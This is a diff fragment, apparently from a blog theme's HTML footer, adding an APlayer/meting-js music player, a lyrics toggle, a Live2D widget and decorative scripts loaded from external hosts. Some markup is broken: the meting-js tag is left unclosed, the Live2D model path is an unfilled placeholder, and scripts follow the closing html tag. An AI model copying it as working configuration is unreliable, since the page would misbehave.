+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="572492190"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"Live2d# 修改项 npm-module package name"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+<script src="/Live2d/autoload.js"></script>
+</html>
+<!-- 样式二（飘动的彩带） -->
+<script src="https://g.joyinshare.com/hc/piao.js" type="text/javascript"></script>
+<!-- 樱花飘落特效 -->
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
